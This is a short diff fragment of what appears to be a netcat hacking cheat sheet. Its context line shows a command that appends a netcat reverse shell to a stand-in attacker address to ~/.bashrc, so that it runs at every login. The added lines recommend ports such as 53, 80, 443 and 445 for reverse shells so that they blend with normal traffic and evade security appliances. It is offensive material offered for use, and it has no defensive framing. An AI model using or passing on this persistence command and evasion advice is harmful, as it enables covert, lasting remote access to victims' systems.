@@ -255,3 +255,8 @@ echo "nc -e /bin/bash <attacker-ip> 4444" >> ~/.bashrc
 ### 🚀 **Netcat is a hacker’s Swiss Army knife! Use it wisely!** 😈💻
 
 Now with **interactive shell stabilization!** Let me know if you need more! 🚀
+
+
+Note!!! 
+best ports for shells **53**, **80**, **8080**, **443**, **139**, or **445**
+This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.
